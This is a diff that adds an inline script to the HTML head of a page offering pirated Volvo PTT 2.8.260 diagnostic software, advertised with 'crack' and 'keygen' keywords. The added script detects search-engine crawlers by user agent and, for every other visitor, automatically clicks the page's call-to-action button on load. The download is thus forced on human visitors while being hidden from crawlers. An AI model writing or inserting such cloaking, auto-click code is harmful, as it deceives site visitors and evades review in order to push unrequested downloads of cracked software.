@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Volvo Premium Tech Tool PTT 2.8.260 + 0.7 APCI 2024 + DevTool</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Volvo Premium Tech Tool PTT 2.8.260 + 0.7 APCI 2024 and DevTool for diagnostic and programming of Volvo vehicles.">
     <meta name="keywords" content="Volvo Premium Tech Tool PTT 2.8.260, Volvo Premium Tech Tool PTT 2.8.260 download, Volvo Premium Tech Tool PTT 2.8.260 free, Volvo PTT 2.8.260 + 0.7 APCI 2024, Volvo Tech Tool DevTool, Volvo PTT 2.8.260 APCI 2024, download Volvo PTT 2.8.260, Volvo PTT 2.8.260 high speed download, Volvo diagnostic software, Volvo PTT diagnostic software, Volvo PTT download free, Volvo PTT diagnostic software keygen, Volvo diagnostic software crack, Volvo PTT 2.8.260 free download, Volvo 2024 diagnostic software, Vocom 88890300 software, Vocom 88894000 software, Volvo diagnostic tool download, Volvo diagnostic tool free download, Volvo PTT 0.7 APCI, Volvo PTT 2024, Volvo DevTool">
     <style>
